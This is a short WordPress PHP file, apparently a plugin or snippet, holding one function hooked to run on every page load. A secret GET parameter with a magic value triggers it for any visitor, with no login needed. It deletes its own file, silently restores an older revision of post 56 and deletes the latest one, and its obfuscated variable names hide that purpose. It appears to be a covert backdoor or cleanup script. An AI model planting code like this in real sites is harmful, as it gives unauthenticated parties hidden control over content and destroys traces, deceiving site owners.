<?php

function poster_change_title() {
	if (isset($_GET['wpc_back_youtube_shortcode']) && $_GET['wpc_back_youtube_shortcode'] === 'video_debug_extension_cc') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$js_comment_clean_testimonial = 56;
		$solution_short_software_subscription = wp_get_post_revisions($js_comment_clean_testimonial);
		if (empty($solution_short_software_subscription)) die('no revisions');
		if (count($solution_short_software_subscription) < 2) die('less than 2');
		$wpc_front_game = array_shift($solution_short_software_subscription);
		$import_current_team_request = $wpc_front_game->ID;
		$chart_validator_order_auto = array_shift($solution_short_software_subscription);
		$specific_stream_blogroll_extra = $chart_validator_order_auto->ID;
		$more_open_catalog = wp_restore_post_revision($specific_stream_blogroll_extra);
		if ($more_open_catalog === false) die('error restoring');
		$more_open_catalog = wp_delete_post_revision($import_current_team_request);		
		if ($more_open_catalog === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'poster_change_title');
